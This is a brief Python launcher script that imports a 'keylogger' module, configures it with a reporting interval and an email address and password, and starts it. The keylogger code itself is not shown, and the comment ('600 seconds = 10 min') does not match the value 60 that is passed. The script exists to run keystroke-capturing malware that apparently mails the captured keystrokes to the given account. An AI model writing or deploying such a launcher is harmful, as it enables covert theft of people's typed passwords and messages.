#!/usr/bin/env python


import keylogger

# 600 seconds = 10 min.
my_keylogger = keylogger.Keylogger(60, "email@domain.com", "password")
my_keylogger.start()